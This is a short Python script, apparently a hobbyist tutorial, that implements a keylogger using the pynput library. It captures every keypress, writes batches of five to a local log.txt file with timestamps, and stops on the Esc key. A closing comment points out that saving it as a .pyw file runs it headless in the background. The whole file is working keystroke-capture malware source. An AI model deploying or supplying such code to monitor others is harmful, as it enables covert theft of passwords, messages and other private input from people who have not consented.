# keylogger using pynput module
# pip is package manager
import pynput
from datetime import datetime
from pynput.keyboard import Key, Listener
'''
above statement is eqivalent to 
from pynput import keyboard
from keyboard import Key,Listener
'''

count = 0
keys = []


with open("log.txt","a") as f:
    #here "a" means append method meaning it will not overwrite the file but continue below it
    f.write("Timestamp " + (str(datetime.now()))[:-7]+":\n\n")


def on_press(key):
    global count,keys 
    #used global so that changes done to variable within function 
    #can be reflected outside of the function
    keys.append(key)
    count+=1
    if (count>=5):
        #in this we are writing 5 characters at a storing in the list key
        #doing this so that program works properly and does not slow down.
        count = 0
        write_file(keys)
        keys = []


def on_release(key):
    #can use pass but used esc to close the program.
    if key == Key.esc:
        return False


def write_file(keys):
    with open("log.txt","a")as f:
        for idx,key in enumerate(keys):
            k = str(key).replace("'","")
            #due to pynput unnecessary sigle qotes come so replace them
            if k.find("space") > 0 and k.find("backspace") == -1:
                f.write("\n")
            elif k.find("Key") == -1 :               
                f.write(k)


if __name__ == "__main__":
    with Listener(on_press = on_press,on_release = on_release) as listener:
        listener.join()
    
    with open("log.txt","a") as f:
        f.write("\n\n")
        f.write("---------------------------------------------------")
        f.write("\n\n")

# extension pyw runs with python windows. it is headless meaning it works in the background.
# py runs with standard terminal.